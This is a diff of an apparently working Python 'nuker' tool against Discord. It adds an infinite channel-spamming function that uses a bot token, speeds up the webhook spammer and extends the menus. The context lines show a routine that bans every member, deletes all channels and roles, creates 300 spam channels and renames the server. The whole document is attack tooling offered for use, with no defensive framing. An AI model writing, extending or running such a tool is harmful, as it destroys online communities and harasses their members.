@@ -29,7 +29,7 @@ print("""
 ║                                                                                       ║
 ║                    ╔═══════════════════════════════════════════════════════════════╗  ║
 ║                    ║     HAQ MASHA VON KATIBA ULTIMATE MULTI-TOOL NUKER           ║  ║
-║                    ║              DISCORD + WEBHOOK + INVITE DESTROYER            ║  ║
+║                    ║       DISCORD + WEBHOOK + INVITE + CHANNEL DESTROYER         ║  ║
 ║                    ╚═══════════════════════════════════════════════════════════════╝  ║
 ║                                                                                       ║
 ╚═══════════════════════════════════════════════════════════════════════════════════════╝
@@ -69,7 +69,74 @@ SPAM_LIST = [
     "@everyone **VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
     "```YOU HAVE BEEN VON KATIBA'ED```",
     "@everyone **HAQ MASHA KILLED THIS SERVER**",
+    "@everyone **الكتيبة هاق مشا تيم - VON KATIBA**",
+    "```LMOT RA7 TARJ3 LOT HHHH```",
 ]
+
+# ============================================
+# CHANNEL SPAMMER (VIA WEBHOOK OR MESSAGE)
+# ============================================
+async def channel_spammer(channel_url):
+    """
+    Spam a Discord channel using either:
+    1. Webhook (if available)
+    2. Direct messages via Discord API
+    """
+    print(f"\n[!] STARTING CHANNEL SPAM ON: {channel_url}")
+    
+    # Extract channel ID from URL
+    channel_id_match = re.search(r'discord\.com/channels/\d+/(\d+)', channel_url)
+    if not channel_id_match:
+        # Try to get just channel ID if direct
+        channel_id_match = re.search(r'(\d{17,20})', channel_url)
+    
+    if not channel_id_match:
+        print("    ✗ INVALID CHANNEL URL!")
+        return
+    
+    channel_id = channel_id_match.group(1)
+    print(f"    ✓ CHANNEL ID: {channel_id}")
+    
+    # Method 1: Try to get webhook from channel (requires bot token)
+    print("\n    🔧 OPTION 1: Trying to find webhook...")
+    
+    # Method 2: Direct API spam (without bot)
+    print("\n    🔧 OPTION 2: Starting direct API spam...")
+    
+    spam_count = 0
+    start_time = time.time()
+    
+    # Discord API endpoint for sending messages (requires bot token)
+    # This will only work if you provide a bot token
+    token = input("\n    🔧 ENTER BOT TOKEN (to send messages): ")
+    
+    headers = {
+        "Authorization": f"Bot {token}",
+        "Content-Type": "application/json"
+    }
+    
+    async with aiohttp.ClientSession() as session:
+        while True:
+            try:
+                for msg in SPAM_LIST:
+                    data = {"content": msg}
+                    async with session.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", 
+                                           headers=headers, json=data) as resp:
+                        if resp.status == 200 or resp.status == 204:
+                            spam_count += 1
+                            if spam_count % 50 == 0:
+                                elapsed = time.time() - start_time
+                                print(f"    ✓ SENT {spam_count} MESSAGES in {elapsed:.1f}s")
+                        elif resp.status == 403:
+                            print("    ✗ BOT HAS NO PERMISSION TO SEND MESSAGES!")
+                            return
+                        elif resp.status == 401:
+                            print("    ✗ INVALID TOKEN!")
+                            return
+                        await asyncio.sleep(0.05)
+            except Exception as e:
+                print(f"    ✗ ERROR: {str(e)[:50]}")
+                await asyncio.sleep(1)
 
 # ============================================
 # WEBHOOK SPAMMER
@@ -86,17 +153,18 @@ async def webhook_spammer(webhook_url):
                 for msg in SPAM_LIST:
                     data = {
                         "content": msg,
-                        "username": random.choice(["HAQ-MASHA", "VON-KATIBA", "NUKER", "DESTROYER"])
+                        "username": random.choice(["HAQ-MASHA", "VON-KATIBA", "NUKER", "DESTROYER", "KATIBA-TEAM"])
                     }
                     async with session.post(webhook_url, json=data) as resp:
                         if resp.status == 204:
                             spam_count += 1
-                            if spam_count % 50 == 0:
-                                print(f"    ✓ SENT {spam_count} MESSAGES...")
-                        await asyncio.sleep(0.05)
+                            if spam_count % 100 == 0:
+                                elapsed = time.time() - start_time
+                                print(f"    ✓ SENT {spam_count} MESSAGES in {elapsed:.1f}s")
+                        await asyncio.sleep(0.02)
             except:
                 pass
-            await asyncio.sleep(0.1)
+            await asyncio.sleep(0.05)
 
 # ============================================
 # SERVER INVITE JOINER & DESTROYER
@@ -141,7 +209,6 @@ async def bot_nuke(token, target_guild_id=None):
         
         guilds = bot.guilds
         
-        # If specific guild ID provided
         if target_guild_id:
             guild = bot.get_guild(int(target_guild_id))
             if guild:
@@ -149,10 +216,9 @@ async def bot_nuke(token, target_guild_id=None):
                 nuke_completed = True
                 await bot.close()
             else:
-                print(f"    ✗ GUILD NOT FOUND! Bot might not be in that server")
+                print(f"    ✗ GUILD NOT FOUND!")
                 await bot.close()
         else:
-            # Nuke all servers
             for guild in guilds:
                 await nuke_guild(guild, bot)
             nuke_completed = True
@@ -168,7 +234,6 @@ async def bot_nuke(token, target_guild_id=None):
 async def nuke_guild(guild, bot):
     print(f"\n    🔥 NUKING: {guild.name}")
     
-    # Get first channel
     first_channel = None
     for channel in guild.text_channels:
         first_channel = channel
@@ -177,7 +242,6 @@ async def nuke_guild(guild, bot):
     if first_channel:
         await first_channel.send("```🔥 HAQ MASHA VON KATIBA NUKE INITIATED 🔥```")
     
-    # Create webhooks
     webhooks = []
     for ch in list(guild.text_channels)[:10]:
         for i in range(3):
@@ -188,7 +252,6 @@ async def nuke_guild(guild, bot):
             except:
                 pass
     
-    # Torture & Ban members
     members = await guild.fetch_members(limit=None).flatten()
     tortured = 0
     for member in members:
@@ -205,7 +268,6 @@ async def nuke_guild(guild, bot):
     
     print(f"    ✓ TORTURED & BANNED: {tortured}")
     
-    # Delete all channels
     for channel in guild.channels:
         try:
             await channel.delete()
@@ -213,7 +275,6 @@ async def nuke_guild(guild, bot):
         except:
             pass
     
-    # Delete all roles
     for role in guild.roles:
         if role.name != "@everyone":
             try:
@@ -222,7 +283,6 @@ async def nuke_guild(guild, bot):
             except:
                 pass
     
-    # Create 300 new channels
     for i in range(300):
         try:
             await guild.create_text_channel(name=f"von-katiba-{i}")
@@ -230,10 +290,8 @@ async def nuke_guild(guild, bot):
         except:
             pass
     
-    # Change server name
     await guild.edit(name="VON KATIBA HAQ MASHA")
     
-    # Start spam
     async def spam():
         while True:
             for channel in guild.text_channels:
@@ -246,7 +304,6 @@ async def nuke_guild(guild, bot):
     
     asyncio.create_task(spam())
     
-    # Webhook spam
     async def webhook_spam():
         while True:
             for webhook in webhooks:
@@ -272,15 +329,17 @@ async def main_menu():
 ║                                                                                       ║
 ║  ┌─────────────────────────────────────────────────────────────────────────────────┐  ║
 ║  │                                                                                 │  ║
-║  │   [1] 🔧 BOT TOKEN NUKE     - Enter a bot token and destroy servers           │  ║
+║  │   [1] 🔧 BOT TOKEN NUKE        - Enter a bot token and destroy servers        │  ║
 ║  │                                                                                 │  ║
-║  │   [2] 🪝 WEBHOOK SPAM       - Enter a webhook URL and spam it infinitely      │  ║
+║  │   [2] 🪝 WEBHOOK SPAM          - Enter a webhook URL and spam it infinitely   │  ║
 ║  │                                                                                 │  ║
-║  │   [3] 🔗 INVITE LINK NUKE   - Enter server invite and destroy it              │  ║
+║  │   [3] 🔗 INVITE LINK NUKE      - Enter server invite and destroy it           │  ║
 ║  │                                                                                 │  ║
-║  │   [4] 💀 ALL IN ONE         - Do everything (Bot + Webhook + Invite)          │  ║
+║  │   [4] 📢 CHANNEL SPAM          - Enter channel link and spam it (no join)     │  ║
 ║  │                                                                                 │  ║
-║  │   [5] 🚪 EXIT               - Close the program                                 │  ║
+║  │   [5] 💀 ALL IN ONE            - Do everything (Bot + Webhook + Invite)       │  ║
+║  │                                                                                 │  ║
+║  │   [6] 🚪 EXIT                  - Close the program                              │  ║
 ║  │                                                                                 │  ║
 ║  └─────────────────────────────────────────────────────────────────────────────────┘  ║
 ║                                                                                       ║
@@ -288,7 +347,7 @@ async def main_menu():
     """)
     
     while True:
-        choice = input("\n📌 CHOOSE AN OPTION (1-5): ")
+        choice = input("\n📌 CHOOSE AN OPTION (1-6): ")
         
         if choice == "1":
             print("\n" + "─"*70)
@@ -333,24 +392,27 @@ async def main_menu():
         
         elif choice == "4":
             print("\n" + "─"*70)
+            channel_url = input("📢 ENTER CHANNEL LINK (e.g., https://discord.com/channels/123456/789012): ")
+            print("\n🔥 STARTING CHANNEL SPAM...")
+            await channel_spammer(channel_url)
+        
+        elif choice == "5":
+            print("\n" + "─"*70)
             print("🔥 ALL IN ONE MODE ACTIVATED 🔥")
             
-            # Bot token
             token = input("🔧 ENTER BOT TOKEN: ")
-            
-            # Webhook
             webhook_url = input("🪝 ENTER WEBHOOK URL (or press Enter to skip): ")
-            
-            # Invite
             invite = input("🔗 ENTER SERVER INVITE LINK (or press Enter to skip): ")
+            channel_url = input("📢 ENTER CHANNEL LINK (or press Enter to skip): ")
             
             print("\n🔥 STARTING ALL ATTACKS SIMULTANEOUSLY...\n")
             
-            # Start webhook spam in background
             if webhook_url and webhook_url.startswith("https://discord.com/api/webhooks/"):
                 asyncio.create_task(webhook_spammer(webhook_url))
             
-            # Join and destroy server
+            if channel_url:
+                asyncio.create_task(channel_spammer(channel_url))
+            
             if invite:
                 invite_code = re.search(r'(?:discord\.gg|discord\.com/invite)/([a-zA-Z0-9_-]+)', invite)
                 if invite_code:
@@ -362,7 +424,7 @@ async def main_menu():
             else:
                 await bot_nuke(token)
         
-        elif choice == "5":
+        elif choice == "6":
             print("\n🚪 EXITING... GOODBYE!")
             break
         
@@ -378,11 +440,14 @@ async def main_menu():
 ║                              🎯 SELECT YOUR WEAPON 🎯                                  ║
 ║                                                                                       ║
 ║  ┌─────────────────────────────────────────────────────────────────────────────────┐  ║
-║  │   [1] 🔧 BOT TOKEN NUKE     - Enter a bot token and destroy servers           │  ║
-║  │   [2] 🪝 WEBHOOK SPAM       - Enter a webhook URL and spam it infinitely      │  ║
-║  │   [3] 🔗 INVITE LINK NUKE   - Enter server invite and destroy it              │  ║
-║  │   [4] 💀 ALL IN ONE         - Do everything (Bot + Webhook + Invite)          │  ║
-║  │   [5] 🚪 EXIT               - Close the program                                 │  ║
+║  │                                                                                 │  ║
+║  │   [1] 🔧 BOT TOKEN NUKE        - Enter a bot token and destroy servers        │  ║
+║  │   [2] 🪝 WEBHOOK SPAM          - Enter a webhook URL and spam it infinitely   │  ║
+║  │   [3] 🔗 INVITE LINK NUKE      - Enter server invite and destroy it           │  ║
+║  │   [4] 📢 CHANNEL SPAM          - Enter channel link and spam it (no join)     │  ║
+║  │   [5] 💀 ALL IN ONE            - Do everything (Bot + Webhook + Invite)       │  ║
+║  │   [6] 🚪 EXIT                  - Close the program                              │  ║
+║  │                                                                                 │  ║
 ║  └─────────────────────────────────────────────────────────────────────────────────┘  ║
 ║                                                                                       ║
 ╚═══════════════════════════════════════════════════════════════════════════════════════╝
